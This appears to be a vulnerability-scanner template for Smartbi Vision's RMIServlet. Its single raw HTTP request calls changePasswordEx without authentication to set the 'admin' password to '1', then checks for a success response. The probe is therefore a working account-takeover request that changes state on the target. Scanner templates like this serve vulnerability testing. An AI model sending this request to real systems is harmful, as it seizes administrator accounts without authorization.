id: smartbi-changepasswordex-reset-passwd

info:
  name: Smartbi - Reset Password
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Detects the Smartbi Vision RMIServlet endpoint allowing password changes via unauthenticated requests.

http:
  - raw:
      - |
        POST /smartbi/vision/RMIServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

        className=UserService&methodName=changePasswordEx&params=["admin","","1"]

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "retCode\":0"
          - "duration\":13"
        condition: and